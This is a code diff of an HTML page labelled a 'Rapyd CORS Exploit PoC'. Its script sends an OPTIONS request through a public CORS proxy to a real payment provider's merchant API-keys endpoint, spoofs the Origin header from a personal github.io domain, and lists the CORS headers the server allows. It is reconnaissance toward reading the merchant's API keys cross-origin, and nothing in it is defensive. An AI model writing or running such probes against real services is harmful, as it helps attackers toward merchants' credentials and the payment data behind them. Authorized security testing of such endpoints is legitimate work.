@@ -4,34 +4,54 @@
     <h2>💣 Rapyd CORS Exploit PoC</h2>
     
     <script>
-async function getAllowedHeaders(url) {
+async function getAllowedHeaders() {
+  const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+  const targetUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
+  
+  console.log('Starting OPTIONS request to:', proxyUrl + targetUrl);
+  
   try {
-    const response = await fetch(url, {
+    const response = await fetch(proxyUrl + targetUrl, {
       method: 'OPTIONS',
       headers: {
         'Accept': 'application/json',
-        // Include other headers if needed for CORS
+        'Origin': 'https://mohamed22233.github.io'
       }
     });
     
+    console.log('Response status:', response.status, response.statusText);
+    
     if (response.ok) {
-      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
-      console.log('Allowed Headers:', allowedHeaders);
-      return allowedHeaders ? allowedHeaders.split(',') : [];
+      const allowedHeaders = response.headers.get('access-control-allow-headers');
+      console.log('Raw Allowed Headers:', allowedHeaders);
+      
+      const headersArray = allowedHeaders ? allowedHeaders.split(',').map(h => h.trim()) : [];
+      
+      console.log('--- Allowed Headers List ---');
+      headersArray.forEach((header, index) => {
+        console.log(`${index + 1}. ${header}`);
+      });
+      console.log('----------------------------');
+      
+      return headersArray;
     } else {
-      console.error('Failed to get OPTIONS response');
+      console.warn('Request was not successful');
       return [];
     }
   } catch (error) {
-    console.error('Error making OPTIONS request:', error);
+    console.error('Error making request:', error);
+    console.error('Error details:', {
+      name: error.name,
+      message: error.message,
+      stack: error.stack
+    });
     return [];
   }
 }
 
-// Usage
-const apiUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
-getAllowedHeaders(apiUrl).then(headers => {
-  console.log('Allowed headers array:', headers);
+// Execute and log the final result
+getAllowedHeaders().then(result => {
+  console.log('Final result:', result);
 });
     </script>
   </body>
